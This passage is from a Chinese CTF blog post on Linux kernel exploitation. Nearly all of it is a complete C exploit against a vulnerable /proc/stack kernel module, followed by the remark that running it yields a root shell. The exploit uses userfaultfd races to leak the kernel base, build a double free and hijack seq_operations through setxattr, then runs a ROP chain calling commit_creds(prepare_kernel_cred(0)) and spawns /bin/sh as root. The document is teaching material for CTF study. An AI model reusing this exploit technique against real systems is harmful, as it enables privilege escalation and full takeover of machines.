class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-type">int</span>             dev_fd;<br><span class="hljs-type">size_t</span>          seq_fd;<br><span class="hljs-type">size_t</span>          seq_fd_reserve[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">char</span>     *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span>   page_size;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">leak_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] push trapped in userfaultfd.&quot;</span>);<br>        pop(&amp;kernel_offset);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak ptr: %p\n&quot;</span>, kernel_offset);<br>        kernel_offset -= <span class="hljs-number">0xffffffff81c37bc0</span>;<br>        kernel_base += kernel_offset;<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">double_free_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pop trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct the double free...&quot;</span>);<br>        pop(page);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff81034505</span>;<br><span class="hljs-type">size_t</span>  xchg_rax_rdi_ret = <span class="hljs-number">0xffffffff81d8df6d</span>;<br><span class="hljs-type">size_t</span>  mov_rdi_rax_pop_rbp_ret = <span class="hljs-number">0xffffffff8121f89a</span>;<br><span class="hljs-type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81600a34</span>;<br><span class="hljs-type">long</span>    flag_fd;<br><span class="hljs-type">char</span>    flag_buf[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">hijack_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger now...&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>            close(seq_fd_reserve[i]);<br><br>        <span class="hljs-comment">// trigger</span><br>        pop_rdi_ret += kernel_offset;<br>        xchg_rax_rdi_ret += kernel_offset;<br>        mov_rdi_rax_pop_rbp_ret += kernel_offset;<br>        prepare_kernel_cred = <span class="hljs-number">0xffffffff81069e00</span> + kernel_offset;<br>        commit_creds = <span class="hljs-number">0xffffffff81069c10</span> + kernel_offset;<br>        swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="hljs-number">0x10</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, swapgs_restore_regs_and_return_to_usermode);<br>        __asm__(<br>            <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>            <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>            <span class="hljs-string">&quot;mov r13,   pop_rdi_ret;&quot;</span><br>            <span class="hljs-string">&quot;mov r12,   0;&quot;</span><br>            <span class="hljs-string">&quot;mov rbp,   prepare_kernel_cred;&quot;</span><br>            <span class="hljs-string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret;&quot;</span>    <br>            <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>            <span class="hljs-string">&quot;mov r10,   commit_creds;&quot;</span><br>            <span class="hljs-string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>            <span class="hljs-string">&quot;mov r8,    0x99999999;&quot;</span><br>            <span class="hljs-string">&quot;xor rax,   rax;&quot;</span><br>            <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>            <span class="hljs-string">&quot;mov rdx,   8;&quot;</span><br>            <span class="hljs-string">&quot;mov rsi,   rsp;&quot;</span><br>            <span class="hljs-string">&quot;mov rdi,   seq_fd;&quot;</span><br>            <span class="hljs-string">&quot;syscall&quot;</span><br>        );<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] back to userland successfully!&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] uid: %d gid: %d\n&quot;</span>, getuid(), getgid());<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] execve root shell now...&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (ioctl(dev_fd, <span class="hljs-number">0x57AC0001</span>, data) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;push!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pop</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (ioctl(dev_fd, <span class="hljs-number">0x57AC0002</span>, data) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pop!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span>      data[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">char</span>        *uffd_buf_leak;<br>    <span class="hljs-type">char</span>        *uffd_buf_uaf;<br>    <span class="hljs-type">char</span>        *uffd_buf_hack;<br>    <span class="hljs-type">int</span>         pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         shm_id;<br>    <span class="hljs-type">char</span>        *shm_addr;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/proc/stack&quot;</span>, O_RDONLY);<br><br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">// reserve object to protect freelist</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>        <span class="hljs-keyword">if</span> ((seq_fd_reserve[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;seq reserve!&quot;</span>);<br><br>    <span class="hljs-comment">// create uffd thread for leak</span><br>    uffd_buf_leak = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_leak, page_size, leak_thread);<br><br>    <span class="hljs-comment">// left dirty data in kmalloc-32</span><br>    shm_id = shmget(<span class="hljs-number">114514</span>, <span class="hljs-number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);<br>    <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmget!&quot;</span>);<br>    shm_addr = shmat(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (shm_addr &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmat!&quot;</span>);<br>    <span class="hljs-keyword">if</span>(shmdt(shm_addr) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmdt!&quot;</span>);<br><br>    <span class="hljs-comment">// leak kernel base    </span><br>    push(uffd_buf_leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-comment">// create uffd thread for double free</span><br>    uffd_buf_uaf = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_uaf, page_size, double_free_thread);<br><br>    <span class="hljs-comment">// construct the double free</span><br>    push(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    pop(uffd_buf_uaf);<br><br>    <span class="hljs-comment">// create uffd thread for hijack</span><br>    uffd_buf_hack = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size * <span class="hljs-number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_hack + page_size, page_size, hijack_thread);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset);<br>    *(<span class="hljs-type">size_t</span> *)(uffd_buf_hack + page_size - <span class="hljs-number">8</span>) = <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset;    <span class="hljs-comment">// add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret</span><br><br>    <span class="hljs-comment">// userfaultfd + setxattr to hijack the seq_ops-&gt;stat, trigger in uffd thread</span><br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    setxattr(<span class="hljs-string">&quot;/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, uffd_buf_hack + page_size - <span class="hljs-number">8</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get root shell</p>
<p><img src="https://i.loli.net/2021/11/28/VKUbpCMhx2fSETq.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0xFF-Whatâ€™s-mote"><a href="#0xFF-Whatâ€™s-mote" class="headerlink" title="0xFF.Whatâ€™s mote?"></a>0xFF.Whatâ€™s mote?</h1><p>always <a target="_blank" rel="noopener" href="https://blog.woooo.tech/2019/12/02/Waiting%20for%20PWN/">waiting for pwn</a>â€¦</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/Linux-Kernel/">#Linux Kernel</a>
      
        <a href="/tags/Pwn/">#Pwn</a>
      
        <a href="/tags/Use-After-Free/">#Use After Free</a>
      
        <a href="/tags/Kernel-UAF/">#Kernel UAF</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>ã€PWN.0x00ã€‘Linux Kernel Pwn Iï¼šBasic Exploit to Kernel Pwn in CTF</div>
      <div>http://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2021å¹´3æœˆ3æ—¥</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/04/08/CVE-0X00-CVE-2016-5195/" title="ã€CVE.0x00ã€‘CVE-2016-5195 â€œè„ç‰›â€æ¼æ´å¤ç°åŠç®€è¦åˆ†æ">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ã€CVE.0x00ã€‘CVE-2016-5195 â€œè„ç‰›â€æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II/" title="ã€OS.0x01ã€‘Linux Kernel IIï¼šå†…æ ¸ç®€æ˜“é£Ÿç”¨æŒ‡åŒ—">
                        <span class="hidden-mobile">ã€OS.0x01ã€‘Linux Kernel IIï¼šå†…æ ¸ç®€æ˜“é£Ÿç”¨æŒ‡åŒ—</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"è¯´ç‚¹ä»€ä¹ˆå‘—ï¼ˆç¬‘ï¼‰","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  <!-- ç½‘ç«™è¿è¡Œæ—¶é—´çš„è®¾ç½® -->
  <span id="timeDate">è½½å…¥å¤©æ•°...</span>
  <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
  <script>
      var now = new Date();
      function createtime() {
